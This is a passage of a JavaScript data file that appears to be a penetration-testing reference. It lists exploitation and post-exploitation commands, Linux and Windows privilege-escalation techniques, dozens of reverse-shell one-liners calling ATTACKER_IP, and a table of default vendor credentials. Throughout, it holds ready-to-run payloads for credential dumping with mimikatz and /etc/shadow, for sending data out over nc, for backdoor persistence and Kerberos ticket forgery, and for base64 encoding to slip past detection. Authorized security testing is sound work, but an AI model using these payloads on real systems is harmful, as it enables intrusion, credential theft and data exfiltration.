  { phase: "Exploitation", item: "XSS exploitation", commands: ["dalfox url 'https://target.com/search?q=test'", "xsstrike -u 'https://target.com/search?q=test'"], tools: ["Dalfox", "XSStrike", "Burp Suite"] },
  { phase: "Exploitation", item: "Password attacks (online)", commands: ["hydra -l admin -P rockyou.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", "medusa -h target.com -u admin -P passwords.txt -M http"], tools: ["Hydra", "Medusa", "Patator"] },
  { phase: "Exploitation", item: "Password attacks (offline)", commands: ["john --wordlist=rockyou.txt hashes.txt", "hashcat -m 0 -a 0 hashes.txt rockyou.txt"], tools: ["John the Ripper", "Hashcat"] },
  { phase: "Exploitation", item: "Exploit known CVEs", commands: ["searchsploit <service> <version>", "msfconsole -q -x 'search <cve>; use 0; set RHOSTS target.com; run'"], tools: ["SearchSploit", "Metasploit", "ExploitDB"] },
  { phase: "Exploitation", item: "File upload exploitation", commands: ["Upload web shell (cmd.php, cmd.aspx); verify execution at upload path"], tools: ["Burp Suite", "curl", "Weevely"] },
  { phase: "Exploitation", item: "Command injection exploitation", commands: ["commix --url='https://target.com/page?cmd=test' --os-cmd=id"], tools: ["Commix", "Burp Suite"] },
  { phase: "Exploitation", item: "Deserialization exploitation", commands: ["java -jar ysoserial.jar CommonsCollections1 'command' | base64", "python3 -c \"import pickle; ...\""], tools: ["ysoserial", "ysoserial.net", "PHPGGC"] },

  // -- Post-Exploitation --
  { phase: "Post-Exploitation", item: "Privilege escalation enumeration (Linux)", commands: ["./linpeas.sh", "python3 linpeas.py", "./linux-exploit-suggester.sh"], tools: ["LinPEAS", "Linux Exploit Suggester", "linux-smart-enumeration"] },
  { phase: "Post-Exploitation", item: "Privilege escalation enumeration (Windows)", commands: ["winPEASany.exe", "powershell -ep bypass -c '. .\\PowerUp.ps1; Invoke-AllChecks'", "accesschk.exe -uwcqv *"], tools: ["WinPEAS", "PowerUp", "Seatbelt"] },
  { phase: "Post-Exploitation", item: "Credential harvesting", commands: ["mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit", "cat /etc/shadow", "reg save HKLM\\SAM sam.bak"], tools: ["Mimikatz", "LaZagne", "secretsdump.py"] },
  { phase: "Post-Exploitation", item: "Lateral movement", commands: ["crackmapexec smb network/24 -u user -p pass --exec-method smbexec", "impacket-psexec user:pass@target.com", "evil-winrm -i target.com -u user -p pass"], tools: ["CrackMapExec", "Impacket", "Evil-WinRM"] },
  { phase: "Post-Exploitation", item: "Data exfiltration", commands: ["tar czf - /sensitive/data | openssl enc -aes-256-cbc -pass pass:key | nc attacker 4444"], tools: ["tar", "openssl", "nc"] },
  { phase: "Post-Exploitation", item: "Persistence mechanisms", commands: ["crontab -e (Linux cron)", "schtasks /create /tn 'Backdoor' /tr cmd.exe /sc minute (Windows)", "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /d cmd.exe"], tools: ["crontab", "schtasks", "reg"] },
  { phase: "Post-Exploitation", item: "Network pivoting", commands: ["ssh -D 9050 user@pivot-host (SOCKS proxy)", "chisel server --reverse --port 8080 (on attacker)", "chisel client attacker:8080 R:socks"], tools: ["SSH", "Chisel", "Ligolo-ng", "sshuttle"] },
  { phase: "Post-Exploitation", item: "Active Directory enumeration", commands: ["bloodhound-python -d target.com -u user -p pass -c all", "Get-DomainUser -Properties samaccountname,description | fl"], tools: ["BloodHound", "SharpHound", "PowerView"] },
  { phase: "Post-Exploitation", item: "Kerberoasting", commands: ["GetUserSPNs.py target.com/user:pass -dc-ip dc_ip -request", "Rubeus.exe kerberoast /outfile:hashes.txt"], tools: ["Impacket", "Rubeus"] },
  { phase: "Post-Exploitation", item: "AS-REP Roasting", commands: ["GetNPUsers.py target.com/ -usersfile users.txt -no-pass -dc-ip dc_ip", "Rubeus.exe asreproast /outfile:hashes.txt"], tools: ["Impacket", "Rubeus"] },

  // -- Reporting --
  { phase: "Reporting", item: "Document all findings with evidence", commands: ["Screenshot each finding", "Record steps to reproduce", "Note affected endpoints and parameters"], tools: ["Greenshot", "Flameshot", "asciinema"] },
  { phase: "Reporting", item: "Assign risk ratings (CVSS)", commands: ["Calculate CVSS 3.1 score for each finding at first.org/cvss/calculator/3.1"], tools: ["CVSS Calculator", "Dradis", "Faraday"] },
  { phase: "Reporting", item: "Verify all findings are reproducible", commands: ["Re-test each finding to confirm it is not a false positive"], tools: ["Burp Suite", "curl", "browser"] },
  { phase: "Reporting", item: "Clean up testing artifacts", commands: ["Remove uploaded shells, test accounts, and data modifications", "Verify no backdoors remain"], tools: ["Manual verification"] },
];

// ---------------------------------------------------------------------------
// 5. LINUX PRIVILEGE ESCALATION (30+ techniques)
// ---------------------------------------------------------------------------

const PRIVESC_LINUX = [
  { name: "SUID Binary Exploitation", check: "find / -perm -4000 -type f 2>/dev/null", exploit: "Check GTFOBins for SUID binaries that can be abused: find, vim, nmap, python, bash, etc. Example: find . -exec /bin/sh -p \\;", tools: ["GTFOBins", "LinPEAS"] },
  { name: "Sudo Misconfiguration", check: "sudo -l", exploit: "If (ALL) NOPASSWD: /usr/bin/vim, use ':!/bin/sh' to get root shell. Check GTFOBins for each allowed binary.", tools: ["GTFOBins", "sudo_killer"] },
  { name: "Writable /etc/passwd", check: "ls -la /etc/passwd", exploit: "If writable, add a root-equivalent user: echo 'newroot:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd", tools: ["Manual"] },
  { name: "Writable /etc/shadow", check: "ls -la /etc/shadow", exploit: "If writable, replace root hash: generate with mkpasswd -m sha-512 password", tools: ["mkpasswd"] },
  { name: "Kernel Exploit", check: "uname -a && cat /etc/os-release", exploit: "Search for kernel exploits: searchsploit linux kernel <version>. Common: DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195), PwnKit (CVE-2021-4034)", tools: ["linux-exploit-suggester", "SearchSploit"] },
  { name: "Cron Job Abuse", check: "cat /etc/crontab; ls -la /etc/cron.*; crontab -l", exploit: "If a cron job runs a writable script, inject reverse shell. If PATH is misconfigurable, create a malicious binary earlier in PATH.", tools: ["pspy", "LinPEAS"] },
  { name: "PATH Hijacking", check: "echo $PATH; find / -writable -type d 2>/dev/null", exploit: "If a privileged script calls a command without full path, create a malicious binary with that name in a writable PATH directory", tools: ["LinPEAS"] },
  { name: "Capabilities Abuse", check: "getcap -r / 2>/dev/null", exploit: "Python with cap_setuid: python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'  /  tar with cap_dac_read_search: tar czf /tmp/shadow.tar.gz /etc/shadow", tools: ["GTFOBins", "LinPEAS"] },
  { name: "NFS no_root_squash", check: "cat /etc/exports; showmount -e localhost", exploit: "If no_root_squash set: mount share as attacker, create SUID binary as root, execute on target", tools: ["mount", "nfs-common"] },
  { name: "Docker Group Membership", check: "id; groups", exploit: "If in docker group: docker run -v /:/mnt --rm -it alpine chroot /mnt sh", tools: ["Docker"] },
  { name: "LXD/LXC Group Membership", check: "id; groups", exploit: "If in lxd group: import alpine image, init with security.privileged=true, mount host root", tools: ["lxc"] },
  { name: "Writable Service Configuration", check: "find /etc/systemd /etc/init.d -writable 2>/dev/null", exploit: "Modify service script to execute reverse shell, then restart the service", tools: ["systemctl", "LinPEAS"] },
  { name: "Wildcard Injection", check: "Check cron jobs or scripts using * in commands", exploit: "tar with wildcard: create --checkpoint=1 --checkpoint-action=exec=sh shell.sh files in target dir", tools: ["Manual analysis"] },
  { name: "LD_PRELOAD Exploitation", check: "sudo -l (look for env_keep+=LD_PRELOAD)", exploit: "Compile a shared library that spawns a shell in its constructor; run: sudo LD_PRELOAD=./malicious.so <allowed_command>", tools: ["gcc"] },
  { name: "Shared Library Hijacking", check: "ldd <suid-binary>; find / -writable -name '*.so' 2>/dev/null", exploit: "If a privileged binary loads a writable shared library, replace it with a malicious one", tools: ["ldd", "strace"] },
  { name: "Writable /etc/ld.so.conf", check: "ls -la /etc/ld.so.conf /etc/ld.so.conf.d/", exploit: "Add path to malicious library directory, run ldconfig, then trigger loading of the library", tools: ["ldconfig"] },
  { name: "Sudo Token Reuse", check: "Check if another user has an active sudo session: ptrace or /proc/PID/status", exploit: "If ptrace is allowed and another process has a cached sudo token, inject into that process to inherit the token", tools: ["sudo_inject"] },
  { name: "Abusing Perl/Python/Ruby SUID Scripts", check: "find / -perm -4000 -name '*.pl' -o -name '*.py' -o -name '*.rb' 2>/dev/null", exploit: "Perl SUID: use exec to spawn shell. Python SUID: import os; os.setuid(0); os.system('/bin/sh')", tools: ["GTFOBins"] },
  { name: "SSH Key Discovery", check: "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null", exploit: "Use discovered private keys to SSH as other users, potentially root", tools: ["ssh", "find"] },
  { name: "History/Config File Credentials", check: "cat ~/.bash_history; cat ~/.mysql_history; find / -name '*.conf' -exec grep -l 'password' {} \\; 2>/dev/null", exploit: "Search history files and configs for plaintext credentials to escalate to other accounts", tools: ["grep", "find", "LinPEAS"] },
  { name: "Writable /etc/sudoers", check: "ls -la /etc/sudoers /etc/sudoers.d/", exploit: "If writable: echo 'username ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers", tools: ["Manual"] },
  { name: "Pkexec (PwnKit CVE-2021-4034)", check: "pkexec --version; find / -name pkexec -perm -4000 2>/dev/null", exploit: "Exploit CVE-2021-4034 for instant root on vulnerable polkit versions (before 0.120)", tools: ["PwnKit exploit", "LinPEAS"] },
  { name: "Sudo Baron Samedit (CVE-2021-3156)", check: "sudoedit -s /", exploit: "Heap-based buffer overflow in sudo before 1.9.5p2 allows local privilege escalation", tools: ["sudo exploit", "SearchSploit"] },
  { name: "Polkit D-Bus Auth Bypass (CVE-2021-3560)", check: "systemctl status polkit", exploit: "Race condition in polkit allows unprivileged user to create admin account", tools: ["exploit script"] },
  { name: "Writable Scripts Run by Root", check: "find / -writable -type f -name '*.sh' 2>/dev/null; check which are run by root (cron, systemd)", exploit: "Add reverse shell payload to any writable script executed by root", tools: ["pspy", "LinPEAS"] },
  { name: "MySQL UDF Privilege Escalation", check: "mysql -u root -p -e 'SELECT @@plugin_dir;'", exploit: "Load a UDF shared library to execute system commands as the MySQL user (often root)", tools: ["UDF exploit", "gcc"] },
  { name: "Abusing Screen with SUID", check: "ls -la /usr/bin/screen; screen --version", exploit: "GNU Screen < 4.5.0 with SUID can be exploited via ld.so.preload to gain root", tools: ["Screen exploit"] },
  { name: "Abusing Fail2ban", check: "ls -la /etc/fail2ban/action.d/; cat /etc/fail2ban/jail.conf", exploit: "If action.d scripts are writable, modify the ban action to execute a reverse shell", tools: ["LinPEAS"] },
  { name: "Timezone (TZ) Variable Exploitation", check: "sudo -l (check if TZ is in env_keep)", exploit: "If TZ is kept with sudo, use it to load a malicious file via tz database path traversal", tools: ["Manual"] },
  { name: "Abusing pip/pip3 with Sudo", check: "sudo -l | grep pip", exploit: "sudo pip install --upgrade --force-reinstall ./malicious_package (setup.py runs as root)", tools: ["pip", "GTFOBins"] },
  { name: "Snap Package Exploitation (Dirty Sock)", check: "snap version; snap list", exploit: "CVE-2019-7304: Create malicious snap to create root user on Ubuntu with vulnerable snapd", tools: ["dirty_sockv2 exploit"] },
  { name: "Abusing at/batch Commands", check: "which at; ls -la /usr/bin/at", exploit: "echo '/bin/sh <&5 >&5 2>&5' | at now (if at is SUID or user is in at.allow)", tools: ["at"] },
];

// ---------------------------------------------------------------------------
// 6. WINDOWS PRIVILEGE ESCALATION (30+ techniques)
// ---------------------------------------------------------------------------

const PRIVESC_WINDOWS = [
  { name: "Unquoted Service Path", check: "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"", exploit: "If service path has spaces and is unquoted (C:\\Program Files\\My App\\service.exe), place malicious exe at C:\\Program.exe or C:\\Program Files\\My.exe", tools: ["PowerUp", "WinPEAS"] },
  { name: "Weak Service Permissions", check: "accesschk.exe /accepteula -uwcqv \"Authenticated Users\" * /svc", exploit: "If service binary path is modifiable: sc config <svc> binpath= \"cmd.exe /c net localgroup administrators user /add\"", tools: ["accesschk", "PowerUp"] },
  { name: "Weak Service Binary Permissions", check: "icacls \"C:\\path\\to\\service.exe\"", exploit: "If service binary is writable by current user, replace it with a malicious executable", tools: ["icacls", "PowerUp", "WinPEAS"] },
  { name: "AlwaysInstallElevated", check: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", exploit: "If both are set to 1: msfvenom -p windows/x64/shell_reverse_tcp -f msi -o shell.msi; msiexec /quiet /qn /i shell.msi", tools: ["msfvenom", "PowerUp"] },
  { name: "Stored Credentials (cmdkey)", check: "cmdkey /list", exploit: "If credentials stored: runas /savecred /user:administrator cmd.exe", tools: ["cmdkey", "runas"] },
  { name: "SAM/SYSTEM Registry Hive Backup", check: "dir C:\\Windows\\Repair\\SAM & dir C:\\Windows\\System32\\config\\RegBack\\", exploit: "Copy SAM and SYSTEM hives, extract hashes: impacket-secretsdump -sam SAM -system SYSTEM LOCAL", tools: ["secretsdump.py", "mimikatz"] },
  { name: "Scheduled Task Permissions", check: "schtasks /query /fo LIST /v | findstr /i \"Task To Run\" | findstr /v \"\\$\"", exploit: "If a scheduled task runs a writable script, modify it to execute a payload as the task's user", tools: ["schtasks", "accesschk", "WinPEAS"] },
  { name: "DLL Hijacking", check: "Use Process Monitor to find missing DLLs loaded by privileged processes", exploit: "Place a malicious DLL in the application directory or a directory earlier in the PATH", tools: ["Process Monitor", "PowerUp", "Robber"] },
  { name: "Token Impersonation (Potato Family)", check: "whoami /priv (look for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege)", exploit: "Use JuicyPotato, PrintSpoofer, RoguePotato, or GodPotato to get SYSTEM: JuicyPotato.exe -l 1337 -p cmd.exe -a '/c whoami' -t *", tools: ["JuicyPotato", "PrintSpoofer", "GodPotato"] },
  { name: "SeBackupPrivilege Abuse", check: "whoami /priv (look for SeBackupPrivilege)", exploit: "Read any file on the system including SAM, SYSTEM, NTDS.dit: robocopy /b C:\\Windows\\System32\\config C:\\temp SAM SYSTEM", tools: ["robocopy", "wbadmin", "diskshadow"] },
  { name: "SeRestorePrivilege Abuse", check: "whoami /priv (look for SeRestorePrivilege)", exploit: "Write to any file/registry key: modify protected system files or add startup entries", tools: ["Manual"] },
  { name: "SeTakeOwnershipPrivilege Abuse", check: "whoami /priv (look for SeTakeOwnershipPrivilege)", exploit: "Take ownership of protected files: takeown /f C:\\Windows\\System32\\config\\SAM; icacls ... /grant user:F", tools: ["takeown", "icacls"] },
  { name: "Registry Autorun Persistence", check: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", exploit: "If writable, add entry: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /d \"C:\\payload.exe\"", tools: ["reg", "Autoruns"] },
  { name: "Kernel Exploit", check: "systeminfo; wmic qfe list full", exploit: "Compare installed patches against known exploits: windows-exploit-suggester.py --database db.xls --systeminfo sysinfo.txt", tools: ["windows-exploit-suggester", "Watson", "Sherlock.ps1"] },
  { name: "Mimikatz Credential Dumping", check: "Check if running as admin or have SeDebugPrivilege", exploit: "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'lsadump::sam' exit", tools: ["Mimikatz", "pypykatz"] },
  { name: "NTDS.dit Extraction", check: "Check if Domain Controller", exploit: "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\" q q  OR  secretsdump.py domain/user:pass@dc-ip", tools: ["ntdsutil", "secretsdump.py", "Mimikatz"] },
  { name: "Pass-the-Hash", check: "Obtain NTLM hash via credential dumping", exploit: "impacket-psexec -hashes LM:NTLM user@target  OR  crackmapexec smb target -u user -H hash", tools: ["Impacket", "CrackMapExec", "Mimikatz"] },
  { name: "Pass-the-Ticket (Kerberos)", check: "mimikatz 'sekurlsa::tickets /export'", exploit: "Import ticket: mimikatz 'kerberos::ptt ticket.kirbi'; access target with imported TGT/TGS", tools: ["Mimikatz", "Rubeus"] },
  { name: "Kerberoasting", check: "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} (find SPNs)", exploit: "GetUserSPNs.py domain/user:pass -dc-ip dc -request; crack TGS hashes with hashcat -m 13100", tools: ["Impacket", "Rubeus", "Hashcat"] },
  { name: "AS-REP Roasting", check: "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}", exploit: "GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip dc; crack with hashcat -m 18200", tools: ["Impacket", "Rubeus", "Hashcat"] },
  { name: "Golden Ticket", check: "Need krbtgt NTLM hash (from DC compromise)", exploit: "mimikatz 'kerberos::golden /user:Administrator /domain:target.com /sid:S-1-5-21-... /krbtgt:hash /ptt'", tools: ["Mimikatz", "Impacket"] },
  { name: "Silver Ticket", check: "Need service account NTLM hash", exploit: "mimikatz 'kerberos::golden /user:Administrator /domain:target.com /sid:S-1-5-21-... /target:server /service:cifs /rc4:hash /ptt'", tools: ["Mimikatz", "Impacket"] },
  { name: "DCSync Attack", check: "Need Replicating Directory Changes rights (Domain Admin by default)", exploit: "mimikatz 'lsadump::dcsync /domain:target.com /user:krbtgt'  OR  secretsdump.py domain/admin:pass@dc", tools: ["Mimikatz", "secretsdump.py"] },
  { name: "PrintNightmare (CVE-2021-34527)", check: "Check if Print Spooler service is running: Get-Service Spooler", exploit: "CVE-2021-34527 exploit to achieve SYSTEM through remote or local Print Spooler vulnerability", tools: ["PrintNightmare exploit", "Impacket"] },
  { name: "ZeroLogon (CVE-2020-1472)", check: "nmap -p 135,445 --script smb-os-discovery dc-ip", exploit: "Exploit Netlogon vulnerability to reset DC machine account password and gain domain admin", tools: ["zerologon exploit", "Impacket"] },
  { name: "LAPS Password Reading", check: "Get-ADComputer -Filter * -Properties ms-mcs-AdmPwd", exploit: "If user has read permissions on LAPS attributes: Get-ADComputer -Identity target -Properties ms-mcs-AdmPwd | select ms-mcs-AdmPwd", tools: ["PowerView", "LAPSToolkit"] },
  { name: "Constrained Delegation Abuse", check: "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne '$null'}", exploit: "Request TGS for delegated service using Rubeus or Impacket, then access as any user", tools: ["Rubeus", "Impacket"] },
  { name: "Unconstrained Delegation Abuse", check: "Get-ADComputer -Filter {TrustedForDelegation -eq $true}", exploit: "Coerce authentication from DC (e.g., SpoolSample/PetitPotam), capture TGT, use for access", tools: ["Rubeus", "SpoolSample", "PetitPotam"] },
  { name: "Shadow Credentials", check: "Check if msDS-KeyCredentialLink is writable", exploit: "Add shadow credential: Whisker.exe add /target:dc$ ; authenticate with certificate", tools: ["Whisker", "Rubeus", "Certipy"] },
  { name: "AD CS (Certipy) Abuse", check: "certipy find -u user@domain -p pass -dc-ip dc (find vulnerable templates)", exploit: "Request certificate with alternative subject name: certipy req -u user@domain -p pass -ca CA -template VulnTemplate -upn admin@domain", tools: ["Certipy", "Certify"] },
  { name: "Group Policy Preferences (GPP)", check: "findstr /S /I cpassword \\\\domain.com\\sysvol\\domain.com\\policies\\*.xml", exploit: "Decrypt cpassword with gpp-decrypt: gpp-decrypt <encrypted_password>", tools: ["gpp-decrypt", "CrackMapExec", "Metasploit"] },
  { name: "DPAPI Credential Extraction", check: "dir C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Credentials\\", exploit: "mimikatz 'dpapi::cred /in:path\\to\\credential' then 'dpapi::masterkey /in:path\\to\\masterkey /password:userpass'", tools: ["Mimikatz", "SharpDPAPI"] },
  { name: "SeDebugPrivilege Exploitation", check: "whoami /priv (look for SeDebugPrivilege)", exploit: "Debug SYSTEM processes: migrate to a SYSTEM process or dump LSASS memory directly", tools: ["Mimikatz", "procdump"] },
];

// ---------------------------------------------------------------------------
// 7. REVERSE SHELLS (25+ one-liners)
// ---------------------------------------------------------------------------

const REVERSE_SHELLS = [
  { language: "Bash (TCP)", payload: "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", notes: "Most common Linux reverse shell; requires bash (not sh)" },
  { language: "Bash (UDP)", payload: "bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1", notes: "UDP variant; useful when TCP egress is filtered" },
  { language: "Bash (196)", payload: "0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196", notes: "Alternative bash method using file descriptor 196" },
  { language: "Netcat (traditional)", payload: "nc -e /bin/sh ATTACKER_IP PORT", notes: "Requires netcat with -e flag (not always available)" },
  { language: "Netcat (OpenBSD)", payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f", notes: "Works with OpenBSD netcat which lacks -e flag" },
  { language: "Netcat (Windows)", payload: "nc.exe ATTACKER_IP PORT -e cmd.exe", notes: "Requires nc.exe on the Windows target; use powershell alternative if unavailable" },
  { language: "Python 3", payload: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", notes: "Works on most Linux systems with Python 3 installed" },
  { language: "Python 2", payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", notes: "For legacy systems still running Python 2" },
  { language: "PHP", payload: "php -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", notes: "Useful on web servers with PHP CLI available" },
  { language: "PHP (exec)", payload: "php -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'", notes: "Alternative PHP method using proc_open" },
  { language: "Perl", payload: "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", notes: "Perl is commonly available on Unix/Linux systems" },
  { language: "Ruby", payload: "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER_IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", notes: "Works on systems with Ruby installed" },
  { language: "Lua", payload: "lua -e 'local s=require(\"socket\");local t=assert(s.tcp());t:connect(\"ATTACKER_IP\",PORT);while true do local r=t:receive();local f=assert(io.popen(r,\"r\"));local b=assert(f:read(\"*a\"));t:send(b);end;f:close();t:close();'", notes: "Requires lua-socket library" },
  { language: "Node.js", payload: "node -e '(function(){var c=require(\"net\").connect(PORT,\"ATTACKER_IP\",function(){var sh=require(\"child_process\").exec(\"/bin/sh -i\");sh.stdout.pipe(c);sh.stderr.pipe(c);c.pipe(sh.stdin)});})()'", notes: "Works on systems with Node.js installed" },
  { language: "Java", payload: "Runtime r = Runtime.getRuntime(); Process p = r.exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\"}); p.waitFor();", notes: "For Java web applications (JSP web shells)" },
  { language: "Groovy", payload: "String host='ATTACKER_IP';int port=PORT;String cmd='/bin/bash';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();", notes: "Useful for Jenkins Script Console exploitation" },
  { language: "PowerShell", payload: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"", notes: "For Windows targets; may need to bypass AMSI/execution policy" },
  { language: "PowerShell (Base64)", payload: "powershell -e <BASE64_ENCODED_PAYLOAD>", notes: "Encode the PowerShell reverse shell as base64 to bypass basic detection" },
  { language: "Socat", payload: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT", notes: "Full TTY reverse shell; listener: socat file:`tty`,raw,echo=0 tcp-listen:PORT" },
  { language: "AWK", payload: "awk 'BEGIN {s = \"/inet/tcp/0/ATTACKER_IP/PORT\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}'", notes: "Works with GNU AWK (gawk)" },
  { language: "Telnet", payload: "TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP PORT 0<$TF | /bin/sh 1>$TF", notes: "Useful when netcat is not available but telnet is" },
  { language: "xterm", payload: "xterm -display ATTACKER_IP:1", notes: "Requires X server on attacker: Xnest :1; authorize target IP" },
  { language: "OpenSSL", payload: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:PORT > /tmp/s; rm /tmp/s", notes: "Encrypted reverse shell; listener: openssl s_server -quiet -key key.pem -cert cert.pem -port PORT" },
  { language: "Golang", payload: "echo 'package main;import(\"os/exec\";\"net\");func main(){c,_:=net.Dial(\"tcp\",\"ATTACKER_IP:PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go", notes: "For systems with Go installed; compiles and runs inline" },
  { language: "C (compiled)", payload: "gcc -o /tmp/rs /tmp/rs.c && /tmp/rs  // Source: #include <sys/socket.h>...connect(fd,(struct sockaddr*)&sa,sizeof(sa));dup2(fd,0);dup2(fd,1);dup2(fd,2);execve(\"/bin/sh\",NULL,NULL);", notes: "Compile on target if gcc is available; static binary also works" },
  { language: "Ncat (SSL)", payload: "ncat --ssl ATTACKER_IP PORT -e /bin/sh", notes: "Encrypted reverse shell using ncat; listener: ncat --ssl -lvnp PORT" },
  { language: "Dart", payload: "import 'dart:io';main(){Socket.connect(\"ATTACKER_IP\",PORT).then((s){Process.start('/bin/sh',[],environment:{}).then((p){s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});});}", notes: "For systems with Dart SDK" },
  { language: "Msfvenom (Linux ELF)", payload: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell.elf", notes: "Generate standalone Linux reverse shell binary" },
  { language: "Msfvenom (Windows EXE)", payload: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe", notes: "Generate standalone Windows reverse shell executable" },
];

// ---------------------------------------------------------------------------
// 8. DEFAULT CREDENTIALS (100+ entries)
// ---------------------------------------------------------------------------

const DEFAULT_CREDS = [
  // -- Networking Equipment --
  { service: "Cisco IOS", username: "admin", password: "admin" },
  { service: "Cisco IOS", username: "cisco", password: "cisco" },
  { service: "Cisco IOS (enable)", username: "", password: "cisco" },
  { service: "Juniper ScreenOS", username: "netscreen", password: "netscreen" },
  { service: "Juniper JunOS", username: "root", password: "Juniper" },
  { service: "MikroTik RouterOS", username: "admin", password: "" },
  { service: "Ubiquiti UniFi", username: "ubnt", password: "ubnt" },
  { service: "Ubiquiti EdgeOS", username: "ubnt", password: "ubnt" },
  { service: "TP-Link Router", username: "admin", password: "admin" },
  { service: "D-Link Router", username: "admin", password: "" },
  { service: "Netgear Router", username: "admin", password: "password" },
  { service: "Linksys Router", username: "admin", password: "admin" },
  { service: "ASUS Router", username: "admin", password: "admin" },
  { service: "Zyxel Router", username: "admin", password: "1234" },
  { service: "Fortinet FortiGate", username: "admin", password: "" },
  { service: "Palo Alto PAN-OS", username: "admin", password: "admin" },
  { service: "SonicWall", username: "admin", password: "password" },
  { service: "Aruba Network", username: "admin", password: "admin" },
  { service: "Ruckus Wireless", username: "super", password: "sp-admin" },
  { service: "Brocade Switch", username: "admin", password: "password" },

  // -- Web Applications --
  { service: "WordPress", username: "admin", password: "admin" },
  { service: "WordPress", username: "admin", password: "password" },
  { service: "Joomla", username: "admin", password: "admin" },
  { service: "Drupal", username: "admin", password: "admin" },
  { service: "phpMyAdmin", username: "root", password: "" },
  { service: "phpMyAdmin", username: "root", password: "root" },
  { service: "phpMyAdmin", username: "pma", password: "" },
  { service: "cPanel", username: "root", password: "password" },
  { service: "Webmin", username: "root", password: "root" },
  { service: "Plesk", username: "admin", password: "setup" },
  { service: "TYPO3", username: "admin", password: "password" },
  { service: "Magento", username: "admin", password: "admin123" },
  { service: "Moodle", username: "admin", password: "admin" },
  { service: "SugarCRM", username: "admin", password: "admin" },

  // -- Databases --
  { service: "MySQL", username: "root", password: "" },
  { service: "MySQL", username: "root", password: "root" },
  { service: "MySQL", username: "root", password: "mysql" },
  { service: "PostgreSQL", username: "postgres", password: "postgres" },
  { service: "PostgreSQL", username: "postgres", password: "" },
  { service: "MongoDB", username: "admin", password: "" },
  { service: "MongoDB", username: "admin", password: "admin" },
  { service: "MSSQL", username: "sa", password: "" },
  { service: "MSSQL", username: "sa", password: "sa" },
